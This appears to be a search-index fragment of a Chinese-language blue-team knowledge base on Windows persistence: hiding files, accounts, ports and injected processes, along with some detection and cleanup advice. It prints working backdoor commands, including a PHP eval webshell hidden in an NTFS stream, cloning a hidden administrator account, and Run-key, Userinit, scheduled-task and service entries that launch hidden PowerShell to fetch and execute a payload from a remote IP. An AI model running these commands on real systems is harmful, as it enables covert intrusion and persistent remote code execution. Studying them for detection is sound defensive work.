https://github.com/boy-hack/WebshellManager","title":"\u6743\u9650\u7ef4\u6301"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#1windows-","text":"","title":"\u7b2c1\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x00","text":"\u653b\u51fb\u8005\u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u901a\u5e38\u4f1a\u7528\u4e00\u4e9b\u540e\u95e8\u6765\u7ef4\u6301\u6743\u9650\uff0c\u5982\u679c\u4f60\u60f3\u8ba9\u4f60\u7684\u540e\u95e8\u4fdd\u6301\u7684\u66f4\u4e45\u4e9b\uff0c\u90a3\u4e48\u8bf7\u9690\u85cf\u597d\u5b83\uff0c\u4f7f\u4e4b\u4e0d\u6613\u88ab\u7ba1\u7406\u5458\u53d1\u73b0\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x01","text":"1\u3001\u5229\u7528\u6587\u4ef6\u5c5e\u6027 \u6700\u7b80\u5355\u7684\u4e00\u79cd\u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\uff0c\u6587\u4ef6\u53f3\u952e\u5c5e\u6027\uff0c\u52fe\u9009\u9690\u85cf\uff0c\u70b9\u51fb\u786e\u5b9a\u540e\uff0c\u5728\u8fd9\u4e2a\u6587\u4ef6\u91cc\u770b\u4e0d\u5230\u521a\u521a\u7684\u6587\u4ef6\u4e86\u3002 \u5982\u679c\u8981\u8ba9\u6587\u4ef6\u663e\u793a\u51fa\u6765\uff0c\u5c31\u70b9\u51fb\u67e5\u770b\uff0c\u52fe\u9009\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\uff0c\u6587\u4ef6\u5c31\u663e\u793a\u51fa\u6765\u3002 \u5982\u4f55\u771f\u6b63\u9690\u85cf\u6587\u4ef6\uff1f \u4f7f\u7528Attrib +s +a +h +r\u547d\u4ee4\u5c31\u662f\u628a\u539f\u672c\u7684\u6587\u4ef6\u5939\u589e\u52a0\u4e86\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3001\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3001\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\u548c\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3002 attrib +s +a +h +r D:\\test\\project\\test .txt \u8fd9\u6837\u5c31\u505a\u5230\u4e86\u771f\u6b63\u7684\u9690\u85cf\uff0c\u4e0d\u7ba1\u4f60\u662f\u5426\u663e\u793a\u9690\u85cf\u6587\u4ef6\uff0c\u6b64\u6587\u4ef6\u5939\u90fd\u770b\u4e0d\u89c1\u3002 \u7834\u89e3\u9690\u85cf\u6587\u4ef6\uff1a \u6253\u5f00\u7535\u8111\u6587\u4ef6\u5939\u9009\u9879\u5361\uff0c\u53d6\u6d88\u201d\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u201c\u52fe\u9009\uff0c\u628a\u201d\u9690\u85cf\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u201c\u4e0b\u9762\u7684\u5355\u9009\u9009\u62e9\u201c\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\u201d\u3002 2\u3001\u5229\u7528ADS\u9690\u85cf\u6587\u4ef6\u5185\u5bb9 \u5728\u670d\u52a1\u5668\u4e0aecho\u4e00\u4e2a\u6570\u636e\u6d41\u6587\u4ef6\u8fdb\u53bb\uff0c\u6bd4\u5982index.php\u662f\u7f51\u9875\u6b63\u5e38\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u5b50\u641e\uff1a \u3000 echo ^<?php @eval($_POST['chopper']);?^> > index.php:hidden.jpg \u8fd9\u6837\u5b50\u5c31\u751f\u6210\u4e86\u4e00\u4e2a\u4e0d\u53ef\u89c1\u7684shell hidden.jpg\uff0c\u5e38\u89c4\u7684\u6587\u4ef6\u7ba1\u7406\u5668\u3001type\u547d\u4ee4\uff0cdir\u547d\u4ee4\u3001del\u547d\u4ee4\u53d1\u73b0\u90fd\u627e\u4e0d\u51fa\u90a3\u4e2ahidden.jpg\u7684\u3002\u3000 \u95ee\u98981\uff1a\u5982\u4f55\u67e5\u770bindex.php:hidden.jpg\u5185\u5bb9\u5462\uff1f \u3000\u3000 \u8fdb\u5165\u6587\u4ef6\u6240\u5728\u76ee\u5f55\uff0cnotepad index.php:hidden.jpg \u6216\u8005 dir /r \u3000\u3000 \u95ee\u98982\uff1a\u5982\u4f55\u5220\u9664index.php:hidden.jpg\uff1f \u76f4\u63a5\u5220\u9664index.php\u5373\u53ef 3\u3001\u9a71\u52a8\u7ea7\u6587\u4ef6\u9690\u85cf \u9a71\u52a8\u9690\u85cf\u6211\u4eec\u53ef\u4ee5\u7528\u8fc7\u4e00\u4e9b\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u8f6f\u4ef6\u540d\u5b57\u53eb\uff1aEasy File Locker \u4e0b\u8f7d\u94fe\u63a5\uff1a http://www.xoslab.com/efl.html \u5982\u679c\u4f60\u5728\u7f51\u7ad9\u76ee\u5f55\u672a\u67e5\u627e\u5230\u76f8\u5173\u6587\u4ef6\uff0c\u4e14\u7cfb\u7edf\u76ee\u5f55\u5b58\u5728\u5b58\u5728\u4ee5\u4e0b\u6587\u4ef6\uff1a c:\\WINDOWS\\xlkfs.dat c:\\WINDOWS\\xlkfs.dll c:\\WINDOWS\\xlkfs.ini c:\\WINDOWS\\system32\\drivers\\xlkfs.sys \u90a3\u4e48\u4f60\uff0c\u5e94\u8be5\u662f\u906d\u9047\u4e86\u9a71\u52a8\u7ea7\u6587\u4ef6\u9690\u85cf\u3002 \u5982\u4f55\u6e05\u9664\uff1f 1\u3001\u67e5\u8be2\u670d\u52a1\u72b6\u6001\uff1a sc qc xlkfs 2\u3001\u505c\u6b62\u670d\u52a1\uff1a net stop xlkfs \u670d\u52a1\u505c\u6b62\u4ee5\u540e\uff0c\u7ecf\u9a71\u52a8\u7ea7\u9690\u85cf\u7684\u6587\u4ef6\u5373\u53ef\u663e\u73b0 3\u3001\u5220\u9664\u670d\u52a1\uff1a sc delete xlkfs 4\u3001\u5220\u9664\u7cfb\u7edf\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\uff0c\u91cd\u542f\u7cfb\u7edf\uff0c\u786e\u8ba4\u670d\u52a1\u5df2\u7ecf\u88ab\u6e05\u7406\u4e86\u3002 \u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\u8fd8\u6709\u5f88\u591a\uff0c\u6bd4\u5982\u4f2a\u88c5\u6210\u4e00\u4e2a\u7cfb\u7edf\u6587\u4ef6\u5939\u56fe\u6807\uff0c\u5229\u7528\u7578\u5f62\u6587\u4ef6\u540d\u3001\u4fdd\u7559\u6587\u4ef6\u540d\u65e0\u6cd5\u5220\u9664\uff0c\u751a\u81f3\u53d6\u4e00\u4e2a\u4e0e\u7cfb\u7edf\u6587\u4ef6\u5f88\u50cf\u7684\u6587\u4ef6\u540d\u5e76\u653e\u5728\u6b63\u5e38\u76ee\u5f55\u91cc\u9762\uff0c\u5f88\u96be\u8fa8\u522b\u51fa\u6765\u3002 \u8fd9\u4e9b\u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\u65e9\u5df2\u4e0d\u518d\u662f\u79d8\u5bc6\uff0c\u800c\u66f4\u591a\u7684\u6076\u610f\u7a0b\u5e8f\u5f00\u59cb\u5b9e\u73b0\u201c\u65e0\u6587\u4ef6\u201d\u653b\u51fb\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6781\u96be\u88ab\u53d1\u73b0\u3002","title":"0x01 \u9690\u85cf\u6587\u4ef6"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x02","text":"window \u9690\u85cf\u7cfb\u7edf\u7528\u6237\u64cd\u4f5c\uff0cCMD\u547d\u4ee4\u884c\u4e0b\uff0c\u5efa\u7acb\u4e86\u4e00\u4e2a\u7528\u6237\u540d\u4e3a\u201ctest$\u201d\uff0c\u5bc6\u7801\u4e3a\u201cabc123!\u201d\u7684\u7b80\u5355\u9690\u85cf\u8d26\u6237,\u5e76\u4e14\u628a\u8be5\u9690\u85cf\u8d26\u6237\u63d0\u5347\u4e3a\u4e86\u7ba1\u7406\u5458\u6743\u9650\u3002 PS:CMD\u547d\u4ee4\u884c\u4f7f\u7528\"net user\",\u770b\u4e0d\u5230\"test$\"\u8fd9\u4e2a\u8d26\u53f7\uff0c\u4f46\u5728\u63a7\u5236\u9762\u677f\u548c\u672c\u5730\u7528\u6237\u548c\u7ec4\u662f\u53ef\u4ee5\u663e\u793a\u6b64\u7528\u6237\u7684\u3002 \u514b\u9686\u8d26\u53f7\u5236\u4f5c\u8fc7\u7a0b\uff1a 1\u3001\u201c\u5f00\u59cb\u201d\u2192\u201c\u8fd0\u884c\u201d\uff0c\u8f93\u5165\u201cregedt32.exe\u201d\u540e\u56de\u8f66,\u9700\u8981\u5230\u201cHKEY_LOCAL_MACHINE\\SAM\\SAM\u201d\uff0c\u5355\u673a\u53f3\u5efa\u6743\u9650\uff0c\u628a\u540d\u53eb\uff1aadministrator\u7684\u7528\u6237\u7ed9\u4e88\uff1a\u5b8c\u5168\u63a7\u5236\u4ee5\u53ca\u8bfb\u53d6\u7684\u6743\u9650\uff0c\u5728\u540e\u9762\u6253\u52fe\u5c31\u884c\uff0c\u7136\u540e\u5173\u95ed\u6ce8\u518c\u8868\u7f16\u8f91\u5668\uff0c\u518d\u6b21\u6253\u5f00\u5373\u53ef\u3002 2\u3001\u6765\u5230\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u7684\u201cHKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\u201d\u5904\uff0c\u70b9\u51fbtest$\u7528\u6237\uff0c\u5f97\u5230\u5728\u53f3\u8fb9\u663e\u793a\u7684\u952e\u503c\u4e2d\u7684\u201c\u7c7b\u578b\u201d\u4e00\u9879\u663e\u793a\u4e3a0x3ec\uff0c\u627e\u5230\u7bad\u5934\u6240\u6307\u76ee\u5f55\u3002 3\u3001\u627e\u5230administrator\u6240\u5bf9\u5e94\u7684\u7684\u9879\u4e3a\u201c000001F4\u201d\uff0c\u5c06\u201c000001F4\u201d\u7684F\u503c\u590d\u5236\u5230\u201c000003EC\u201d\u7684F\u503c\u4e2d\uff0c\u4fdd\u5b58\u3002 4\u3001\u5206\u522btest \u548c\u201c000003EC\u5bfc\u51fa\u5230\u684c\u9762\uff0c\u5220\u9664test \u548c\u201c000003EC\u5bfc\u51fa\u5230\u684c\u9762\uff0c\u5220\u9664test \u7528\u6237 net user test$ /del 5\u3001\u5c06\u521a\u624d\u5bfc\u51fa\u7684\u4e24\u4e2a\u540e\u7f00\u4e3a.reg\u7684\u6ce8\u518c\u8868\u9879\u5bfc\u5165\u6ce8\u518c\u8868\u4e2d\u3002\u8fd9\u6837\u6240\u8c13\u7684\u9690\u85cf\u8d26\u6237\u5c31\u521b\u5efa\u597d\u4e86\u3002PS\uff1a\u4e0d\u7ba1\u4f60\u662f\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\u8f93\u5165net user \u6216\u8005\u5728\u7cfb\u7edf\u7528\u6237\u7ba1\u7406\u754c\u9762\u90fd\u662f\u770b\u4e0d\u5230test$\u8fd9\u4e2a\u8d26\u6237\u7684\uff0c\u53ea\u6709\u5728\u6ce8\u518c\u8868\u4e2d\u624d\u80fd\u770b\u5f97\u5230\u3002 \u68c0\u6d4b\u548c\u6e05\u7406\u65b9\u6cd5\uff1a \u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u4f7f\u7528\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u529f\u80fd\u8fdb\u884c\u67e5\u770b\uff0c\u53ef\u68c0\u6d4b\u51fa\u9690\u85cf\u3001\u514b\u9686\u8d26\u53f7\u3002","title":"0x02 \u9690\u85cf\u8d26\u53f7"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x03","text":"\u901a\u8fc7\u7aef\u53e3\u590d\u7528\u6765\u8fbe\u5230\u9690\u85cf\u7aef\u53e3\u7684\u76ee\u7684\uff0c\u5728Window\u4e0b\uff0c\u5982\u4f55\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u5462\uff1f \u524d\u9635\u5b50\uff0c@Twi1ight\u516c\u5e03\u4e86\u4e00\u79cd\u57fa\u4e8e\u5185\u7f6e\u7cfb\u7edf\u670d\u52a1\u7684\u7aef\u53e3\u590d\u7528\u540e\u95e8\u65b9\u6cd5\uff0c\u5229\u7528WinRM\u670d\u52a1\uff0c\u4e00\u6761\u547d\u4ee4\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u540e\u95e8\uff1a winrm set winrm/config/service @{EnableCompatibilityHttpListener=\"true\"} \u4e00\u822c\u5f00\u542fWinRM\u670d\u52a1\u4f5c\u4e3a\u8fdc\u7a0b\u7ba1\u7406\uff0c\u4f46\u8fd8\u662f\u7b2c\u4e00\u6b21\u542c\u5230\u53ef\u4ee5\u4f5c\u4e3a\u7aef\u53e3\u590d\u7528\uff0c\u4e00\u79cd\u7b80\u5355\u5bb9\u6613\u5b9e\u73b0\u7684\u7aef\u53e3\u590d\u7528\u65b9\u5f0f\u3002\u5047\u8bbe\uff0c\u653b\u51fb\u8005\u5df2\u83b7\u53d6\u5230administrator\u8d26\u53f7\u5bc6\u7801\uff0c\u8fde\u63a5\u8fdc\u7a0bWinRM\u670d\u52a1\u6267\u884c\u547d\u4ee4\uff1a \u5f53\u6267\u884c\u8fd9\u6761\u547d\u4ee4\u7684\u540c\u65f6\uff0c\u5c06\u5728\u5b89\u5168\u65e5\u5fd7\u4e2d\u7559\u4e0b\u75d5\u8ff9\uff0c \u53e6\u5916\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u91cd\u5b9a\u5411\uff0c\u5de5\u5177\uff1a https://github.com/crabkun/Switcher","title":"0x03 \u7aef\u53e3\u590d\u7528"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x04","text":"\u8fdb\u7a0b\u6ce8\u5165\uff0c\u4e00\u76f4\u662f\u75c5\u6bd2\u6728\u9a6c\u7684\u60ef\u7528\u624b\u6bb5\uff0c\u540c\u65f6\uff0c\u5b83\u4e5f\u662f\u4e00\u79cd\u9690\u85cf\u6280\u672f\u3002\u5728\u5e38\u89c1\u7684\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u4e2d\uff0c\u8fdb\u7a0b\u6ce8\u5165\u662f\u600e\u4e48\u505a\u7684\u4ee5\u53ca\u6211\u4eec\u5982\u4f55\u901a\u8fc7\u5de5\u5177\u6392\u67e5\u51fa\u6765\uff1f 1\u3001meterpreter\u4f1a\u8bdd\u6ce8\u5165 \u5f53\u524d\u6743\u9650\u65e0\u6cd5\u83b7\u53d6hash\u503c\uff0c\u67e5\u770b\u76ee\u524d\u7cfb\u7edf\u8fdb\u7a0b \u901a\u8fc7migrate\u5c06\u8fdb\u7a0b\u6ce8\u5165\u5230system\u8fdb\u7a0b\u540e\uff0c\u6210\u529f\u83b7\u5f97hash\u503c\u3002 Window\u540e\u95e8\u6392\u67e5\uff1a \u901a\u8fc7TCPview\u663e\u793a\u5df2\u5efa\u7acb\u7684TCP\u8fde\u63a5\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f02\u5e38\u7684\u8fde\u63a5\uff0c\u540c\u65f6\uff0c\u6076\u610f\u8f6f\u4ef6\u5c06\u4ee5\u7eff\u8272\u663e\u793a\u4e0d\u5230\u4e00\u79d2\u949f\uff0c\u7136\u540e\u53d8\u6210\u7ea2\u8272\u6d88\u5931\uff0c\u5982\u6b64\u5faa\u73af\u3002 2\u3001Empire\u4f1a\u8bdd\u8fdb\u7a0b\u6ce8\u5165 \u901a\u8fc7psinject\u6a21\u5757\u8fdb\u884c\u4f1a\u8bdd\u6ce8\u5165\uff0c\u76f4\u63a5\u8f93\u5165ps\u9009\u62e9\u4e00\u4e2aSYSTEM\u6743\u9650\u7684\u8fdb\u7a0bPID\uff0c\u4f7f\u7528\u8fdb\u7a0b\u6ce8\u5165\u6a21\u5757\uff0c\u6765\u83b7\u53d6\u6743\u9650\u3002\u5982\u4e0b\u56fe\uff1a Window\u540e\u95e8\u6392\u67e5\uff1a\u5229\u7528process monitor\u6216\u8005\u706b\u7ed2\u5251\u76d1\u63a7\u8fdb\u7a0b\u90fd\u53ef\u4ee5\u5b9a\u4f4d\u5230\u6ce8\u5165\u8fdb\u7a0b\u3002 3\u3001Cobalt Strike\u8fdb\u7a0b\u6ce8\u5165 \u9009\u62e9\u8fdb\u7a0b\uff0c\u70b9\u51fbinject\uff0c\u968f\u540e\u9009\u62e9\u76d1\u542c\u5668\uff0c\u70b9\u51fbchoose\uff0c\u5373\u53ef\u53d1\u73b0Cobaltstrike\u5f39\u56de\u4e86\u76ee\u6807\u673a\u7684\u4e00\u4e2a\u65b0\u4f1a\u8bdd\uff0c\u8fd9\u4e2a\u4f1a\u8bdd\u5c31\u662f\u6210\u529f\u6ce8\u5165\u5230\u67d0\u8fdb\u7a0b\u7684beacon\u3002 Window\u540e\u95e8\u6392\u67e5\uff1a\u5229\u7528process monitor\u6355\u6349\u901a\u4fe1\u8fc7\u7a0b\uff0c\u6709\u89c4\u5f8b\u7684\u8bf7\u6c42\u53d6\u51b3\u4e8esleep\u8bbe\u7f6e\u7684\u95f4\u9694\u3002","title":"0x04 \u8fdb\u7a0b\u6ce8\u5165"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x05","text":"\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86Window\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\uff0c\u5305\u62ec\u9690\u85cf\u6587\u4ef6\u3001\u9690\u85cf\u8d26\u53f7\u3001\u7aef\u53e3\u590d\u7528\u3001\u8fdb\u7a0b\u6ce8\u5165\u7b49\u65b9\u9762\u7684\u7b80\u5355\u5b9e\u73b0\u53ca\u5176\u6392\u67e5\u6280\u5de7\u3002\u4ec5\u4f5c\u629b\u7816\u5f15\u7389\u4e4b\u7528\uff0c\u6b22\u8fce\u7559\u8a00\u5206\u4eab\u3002 \u53c2\u8003\u94fe\u63a5\uff1a Canisrufus:\u4e00\u6b3e\u57fa\u4e8ePython\u7684Windows\u9690\u85cf\u540e\u95e8 https://github.com/maldevel/canisrufus windows\u5e38\u89c1backdoor\u3001\u6743\u9650\u7ef4\u6301\u65b9\u6cd5\u53ca\u6392\u67e5\u6280\u672f https://xz.aliyun.com/t/4842 TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/ Hide Toolz \u8fdb\u7a0b\u9690\u85cf\u5de5\u5177 \u5b98\u7f51\u5730\u5740: https://www.hidetoolz.com/ HideToolz\u662f\u4e00\u6b3e\u7b80\u5355\u5c0f\u5de7\u7684\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u9690\u85cf\u8fdb\u7a0b\uff0c\u4e00\u952e\u9690\u85cf\u4f60\u60f3\u9690\u85cf\u7684\u7a0b\u5e8f","title":"0x05 \u7ed3\u675f"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#cymothoa","text":"\u6ce8\u5165\u5de5\u5177 cs \u8fdb\u7a0b\u6ce8\u5165 https://bbs.ichunqiu.com/thread-53003-1-1.html","title":"Cymothoa"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#metasploit-dll","text":"https://blog.csdn.net/Fly_hps/article/details/80427707 \u51e0\u79cd\u540e\u95e8\u548c\u6743\u9650\u7ef4\u6301\u6280\u672f\u5916\u8fd8\u6709\u50cf\u662fdll\u52ab\u6301\u3001\u4e00\u4e9b\u8f6f\u4ef6\u7684\u63d2\u4ef6\u540e\u95e8\u3001office\u540e\u95e8\u7b49\u3002 https://blog.csdn.net/qq_33020901/article/details/89504902","title":"Metasploit\u6ce8\u5165 dll"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#2windows-","text":"\u5173\u952e\u8bcd\uff1aWindows\u7cfb\u7edf\u540e\u95e8\u3001\u6743\u9650\u7ef4\u6301 \u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u901a\u5e38\u4f1a\u7528\u4e00\u4e9b\u540e\u95e8\u6280\u672f\u6765\u7ef4\u6301\u670d\u52a1\u5668\u6743\u9650\uff0c\u670d\u52a1\u5668\u4e00\u65e6\u88ab\u690d\u5165\u540e\u95e8\uff0c\u653b\u51fb\u8005\u4fbf\u5982\u5165\u65e0\u4eba\u4e4b\u5883\u3002\u672c\u6587\u5c06\u5bf9\u5e38\u89c1\u7684window\u670d\u52a1\u7aef\u81ea\u542f\u52a8\u540e\u95e8\u6280\u672f\u8fdb\u884c\u89e3\u6790\uff0c\u77e5\u5df1\u77e5\u5f7c\u65b9\u80fd\u675c\u7edd\u540e\u95e8\u3002 0x01 \u6ce8\u518c\u8868\u81ea\u542f\u52a8 \u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u81ea\u542f\u52a8\u952e\u503c\uff0c\u6dfb\u52a0\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f\u8def\u5f84\uff0c\u5b9e\u73b0\u5f00\u673a\u81ea\u542f\u52a8\u3002 \u5e38\u7528\u7684\u6ce8\u518c\u8868\u542f\u52a8\u952e\uff1a # Run\u952e HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run # Winlogon\\Userinit\u952e HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon \u7c7b\u4f3c\u7684\u8fd8\u6709\u5f88\u591a,\u5173\u952e\u8bcd\uff1a\u6ce8\u518c\u8868\u542f\u52a8\u952e\u503c\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u53ef\u4ee5\u4e00\u952e\u5b9e\u73b0\u65e0\u6587\u4ef6\u6ce8\u518c\u8868\u540e\u95e8\uff1a reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" /f Logon Scripts \u540e\u95e8 \u6ce8\u518c\u8868\u8def\u5f84\uff1aHKEY_CURRENT_USER\\Environment\\ \u521b\u5efa\u5b57\u7b26\u4e32\u952e\u503c\uff1a UserInitMprLogonScript\uff0c\u952e\u503c\u8bbe\u7f6e\u4e3abat\u7684\u7edd\u5bf9\u8def\u5f84\uff1a c:\\test.bat userinit\u540e\u95e8 \u5728\u7528\u6237\u8fdb\u884c\u767b\u9646\u65f6\uff0cwinlogon\u8fd0\u884c\u6307\u5b9a\u7684\u7a0b\u5e8f\u3002\u6839\u636e\u5b98\u65b9\u6587\u6863,\u53ef\u4ee5\u66f4\u6539\u5b83\u7684\u503c\u6765\u6dfb\u52a0\u4e0e\u5220\u9664\u7a0b\u5e8f\u3002 \u5229\u7528USERINIT\u6ce8\u518c\u8868\u952e\u5b9e\u73b0\u65e0\u6587\u4ef6\u540e\u95e8\uff1a [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon] \"Userinit\"=\"C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" 0x02 \u7ec4\u7b56\u7565\u8bbe\u7f6e\u811a\u672c\u542f\u52a8 \u8fd0\u884cgpedit.msc\u8fdb\u5165\u672c\u5730\u7ec4\u7b56\u7565\uff0c\u901a\u8fc7Windows\u8bbe\u7f6e\u7684\u201c\u811a\u672c(\u542f\u52a8/\u5173\u673a)\u201d\u9879\u6765\u8bf4\u5b9e\u73b0\u3002\u56e0\u4e3a\u5176\u6781\u5177\u9690\u853d\u6027\uff0c\u56e0\u6b64\u5e38\u5e38\u88ab\u653b\u51fb\u8005\u5229\u7528\u6765\u505a\u670d\u52a1\u5668\u540e\u95e8\u3002 \u5bb9\u6613\u9047\u5230\u7684\u95ee\u9898\uff1a\u811a\u672c\u9700\u5168\u8def\u5f84\uff0c\u5982 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 0x03 \u8ba1\u5212\u4efb\u52a1 \u901a\u8fc7window\u7cfb\u7edf\u7684\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u529f\u80fd\u5b9e\u73b0\u5b9a\u65f6\u542f\u52a8\u67d0\u4e2a\u4efb\u52a1\uff0c\u6267\u884c\u67d0\u4e2a\u811a\u672c\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u53ef\u4ee5\u4e00\u952e\u5b9e\u73b0\uff1a schtasks /create /sc minute /mo 1 /tn \"Security Script\" /tr \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring(\\\"\\\"\\\"http://192.168.28.142:8888/logo.gif\\\"\\\"\\\"))\\\"\" \u5bb9\u6613\u9047\u5230\u7684\u95ee\u9898\uff1acmd\u547d\u4ee4\u884c\u6267\u884c\u5355\u5f15\u53f7\u4f1a\u88ab\u66ff\u6362\u6210\u53cc\u5f15\u53f7\uff0c\u6545\u8fd9\u91cc\u4f7f\u7528\u4e09\u4e2a\u53cc\u5f15\u53f7\u66ff\u4ee3\u3002 \u8ba1\u5212\u811a\u672c\u6bcf 1 \u5206\u949f\u8fd0\u884c\u4e00\u6b21\u3002 0x04 \u670d\u52a1\u81ea\u542f\u52a8 \u901a\u8fc7\u670d\u52a1\u8bbe\u7f6e\u81ea\u542f\u52a8\uff0c\u7ed3\u5408powershell\u5b9e\u73b0\u65e0\u6587\u4ef6\u540e\u95e8\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u53ef\u5b9e\u73b0\uff1a sc create \"KeyName\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" sc description KeyName \"Just For Test\" //\u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config Name start= auto //\u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start Name //\u542f\u52a8\u670d\u52a1 \u6210\u529f\u521b\u5efa\u4e86\u4e00\u4e2a\u81ea\u542f\u52a8\u670d\u52a1 0x05 WMI\u540e\u95e8 \u57282015\u5e74\u7684blackhat\u5927\u4f1a\u4e0aMatt Graeber\u4ecb\u7ecd\u4e86\u4e00\u79cd\u65e0\u6587\u4ef6\u540e\u95e8\u5c31\u662f\u7528\u7684WMI\u3002\u8fd9\u91cc\u53ef\u4ee5\u5229\u7528\u4e00\u4e2a\u5de5\u5177powersploit\uff0c\u4e0b\u9762\u7528\u5b83\u7684Persistence\u6a21\u5757\u6765\u793a\u8303\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002 Import-Module .\\Persistence\\Persistence.psm1 $ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM' $UserOptions = New-UserPersistenceOption -Registry -AtLogon Add-Persistence -FilePath .\\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose 0x06 dll\u52ab\u6301 \u5982\u679c\u5728\u8fdb\u7a0b\u5c1d\u8bd5\u52a0\u8f7d\u4e00\u4e2aDLL\u65f6\u6ca1\u6709\u6307\u5b9aDLL\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u90a3\u4e48Windows\u4f1a\u5c1d\u8bd5\u53bb\u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u67e5\u627e\u8fd9\u4e2aDLL\uff1b\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u63a7\u5236\u5176\u4e2d\u7684\u67d0\u4e00 \u4e2a\u76ee\u5f55\uff0c\u5e76\u4e14\u653e\u4e00\u4e2a\u6076\u610f\u7684DLL\u6587\u4ef6\u5230\u8fd9\u4e2a\u76ee\u5f55\u4e0b\uff0c\u8fd9\u4e2a\u6076\u610f\u7684DLL\u4fbf\u4f1a\u88ab\u8fdb\u7a0b\u6240\u52a0\u8f7d\uff0c\u4ece\u800c\u9020\u6210\u4ee3\u7801\u6267\u884c\u3002 \u6bd4\u8f83\u5e38\u7528\u7684\u5982LPK.dll\u7684\u52ab\u6301\uff1a 